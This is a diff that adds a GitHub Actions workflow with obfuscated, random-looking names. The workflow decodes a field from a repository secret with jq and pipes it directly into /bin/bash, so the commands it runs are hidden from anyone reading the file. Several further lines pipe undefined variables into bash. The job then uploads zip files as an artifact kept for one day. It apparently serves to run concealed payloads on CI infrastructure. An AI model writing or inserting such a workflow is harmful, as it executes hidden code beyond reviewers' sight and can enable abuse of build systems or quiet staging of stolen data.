@@ -1,0 +1,25 @@
+name: arianacloud889
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: arianacloud889
+        env:
+          rak573: ${{ secrets.rak573 }}
+        run: |
+          printf '%s' "$rak573" | jq -r .mevzc2 | /bin/bash
+          echo $jjcpk4 | jq -r .mkeg266 | /bin/bash
+          printf '%s' "$z69019" | jq -r .q9076 | /bin/bash
+          echo $vz886 | jq -r .i4 | /bin/bash
+          echo $mnl16879 | jq -r .sazzf1 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: 7Fdbmn5L
+          path: "*.zip"
+          retention-days: 1
